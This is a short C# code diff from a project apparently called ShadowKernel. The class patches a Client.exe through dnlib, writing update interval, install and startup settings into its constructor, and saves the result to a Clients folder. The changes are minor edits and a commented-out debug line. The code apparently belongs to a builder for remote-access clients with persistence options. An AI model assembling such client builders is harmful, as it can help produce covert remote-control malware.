@@ -1,5 +1,6 @@
 ﻿using System;
 using System.IO;
+using System.Windows.Threading;
 using System.Linq;
 using dnlib.DotNet;
 
@@ -20,7 +21,7 @@ namespace ShadowKernel.Classes
             ClientSettings.Startup = Startup == "True" ? "True" : "False";           
             string FullName = "Client.ClientSettings";
             
-            var Assembly = AssemblyDef.Load("Client.exe");
+            var Assembly =  AssemblyDef.Load("Client.exe");
             var Module = Assembly.ManifestModule;
             if (Module != null)
             {
@@ -37,6 +38,8 @@ namespace ShadowKernel.Classes
                         Constructor.Body.Instructions[8].Operand = ClientSettings.UpdateInterval;
                         Constructor.Body.Instructions[10].Operand = ClientSettings.Install;
                         Constructor.Body.Instructions[12].Operand = ClientSettings.Startup;
+                        //System.Windows.Forms.MessageBox.Show(Constructor.Body.Instructions[0].Operand.ToString() + Constructor.Body.Instructions[2].Operand.ToString() +
+                        //    Constructor.Body.Instructions[4].Operand.ToString() + Constructor.Body.Instructions[6].Operand.ToString());
                         if (!Directory.Exists(Environment.CurrentDirectory + @"\Clients"))
                             Directory.CreateDirectory(Environment.CurrentDirectory + @"\Clients");
                         try { Assembly.Write(Name); } catch { }
